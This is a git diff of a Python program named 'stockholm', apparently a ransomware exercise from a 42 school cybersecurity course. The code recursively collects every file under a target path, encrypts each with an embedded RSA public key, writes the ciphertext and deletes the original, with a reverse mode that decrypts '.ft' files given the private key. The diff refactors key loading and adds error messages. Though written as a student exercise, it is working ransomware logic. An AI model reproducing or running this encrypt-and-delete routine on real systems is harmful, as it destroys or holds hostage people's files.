@@ -6,7 +6,7 @@
 #    By: guferrei <guferrei@student.42sp.org.br>    +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2025/02/14 21:33:17 by guferrei          #+#    #+#              #
-#    Updated: 2025/02/18 15:33:44 by guferrei         ###   ########.fr        #
+#    Updated: 2025/02/18 15:47:45 by guferrei         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -31,29 +31,31 @@ def program_args():
 	group.add_argument('-s', '--silent', action="store_true", help="run the program in silent mode")
 	return parser.parse_args()
 
+
 def print_version():
 	print("stockholm 1.0.0")
 
-def get_files():
+
+def get_files(filter):
 	file_list = []
-	for file in glob.glob(PATH + "/**/*", recursive=True):
+	for file in glob.glob(PATH + filter, recursive=True):
 		if os.path.isfile(file):
 			file_list.append(file)
 	return file_list
+
 
 def load_file_content(file):
 	with open(file, 'rb') as f:
 		data = f.read()
 		return data
 
-def encrypt(file, args):
+
+def encrypt(file, public_key, args):
 	if not args.silent:
 		print("ecrypting file {}...".format(file))
 	plaintext = load_file_content(file)
 
 	if plaintext:
-		public_key = serialization.load_pem_public_key(PUBLIC_KEY)
-
 		ciphertext = public_key.encrypt(
 			plaintext,
 			padding.OAEP(
@@ -67,11 +69,10 @@ def encrypt(file, args):
 			f.write(ciphertext)
 		os.remove(file)
 
-def decrypt(file, key):
+
+def decrypt(file, private_key):
 	ciphertext = load_file_content(file)
 	if ciphertext:
-		private_key = serialization.load_pem_private_key(key.encode(), password=None)
-
 		plaintext = private_key.decrypt(
 			ciphertext,
 			padding.OAEP(
@@ -85,15 +86,32 @@ def decrypt(file, key):
 			f.write(plaintext)
 		os.remove(file)
 
+
 def reverse(key: str):
-	file_list = get_files()
+	file_list = get_files("/**/*.ft")
+	try:
+		private_key = serialization.load_pem_private_key(key.encode(), password=None)
+	except:
+		print("Private key is invalid. Decryption failed!!")
+		return
+
 	for file in file_list:
-		decrypt(file, key)
+		decrypt(file, private_key)
+	print("Decryption Successful")
+
 
 def run(args):
-	file_list = get_files()
+	file_list = get_files("/**/*")
+	try:
+		public_key = serialization.load_pem_public_key(PUBLIC_KEY)
+	except:
+		if not args.silent:
+			print("Public key is invalid. Generate a valid 1024 bit public key!!!")
+		return
+
 	for file in file_list:
-		encrypt(file, args)
+		encrypt(file, public_key, args)
+
 
 def main():
 	args = program_args()
@@ -103,6 +121,7 @@ def main():
 		reverse(args.reverse)
 		return
 	run(args)
+
 
 if __name__ == '__main__':
 	main()
